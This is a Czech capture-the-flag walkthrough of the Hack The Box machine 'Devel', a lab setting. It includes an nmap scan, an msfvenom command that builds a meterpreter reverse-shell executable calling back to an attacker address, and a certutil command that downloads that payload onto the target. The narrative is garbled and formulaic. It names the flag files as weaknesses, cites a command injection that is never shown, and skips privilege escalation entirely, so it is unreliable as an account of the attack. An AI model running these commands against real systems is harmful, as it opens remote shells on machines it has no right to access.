## Úvod a kontext

Devel stojí na řetězení několika konkrétních slabin a artefaktů: `user.txt.txt` a `root.txt.txt`.

Důležitější než samotný exploit je tady interpretace mezikroků, protože právě z těchto indicií vzniká shell získaný exploitací zranitelné služby a teprve na něj navazuje lokální enumeraci po získání shellu.

## Počáteční průzkum

### Vyhledání otevřených portů

Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
```bash
IP=10.10.10.5;ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);nmap -p $ports -A -sC -sV -v $IP
```

## Získání přístupu

V této fázi převádím předchozí zjištění do praktického kroku, který má vést k ověřitelnému přístupu nebo k dalším citlivým datům.
```text
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o test.exe
```
```
certutil.exe -urlcache -split -f http://10.10.14.5:8000/exe/test.exe c:\programdata\test.exe
```

### Získání user flagu

User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.
```bash
type user.txt.txt
```
```
__CENSORED__
```

## Eskalace oprávnění

### Získání root flagu

Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
```bash
type root.txt.txt
```
```
__CENSORED__
```

## Shrnutí klíčových poznatků

- Z hlediska rozhodování bylo nejdůležitější správně přečíst vazbu mezi command injection, `user.txt.txt` a `root.txt.txt`.
- K uživatelskému kontextu vedl konkrétní a ověřitelný krok: shell získaný exploitací zranitelné služby.
- Poslední část ukazuje, že po získání shellu rozhoduje hlavně to, jakou roli hraje lokální enumerace po získání shellu.

## Co si odnést do praxe

- V tomhle článku se první slabé místo otevřelo přes command injection, `user.txt.txt` a `root.txt.txt`. Příkazy skládající shell řetězce z neověřeného vstupu patří mezi nejrizikovější konstrukce; i zdánlivě omezený parametr se obvykle dá převést na RCE.
- Stabilní foothold pak stojí na principu shell získaný exploitací zranitelné služby. Jednorázové RCE je potřeba detekovat i na aplikační vrstvě; upload, template injection nebo command injection často vypadají v logu nenápadně, ale vedou ke stabilnímu shellu.
- Pro závěrečnou fázi je podstatné, že rozhodla lokální enumerace po získání shellu. Po získání shellu je rozhodující systematická lokální enumerace; i bez další CVE často rozhodne kombinace špatných oprávnění, reuse tajemství a pomocných skriptů.
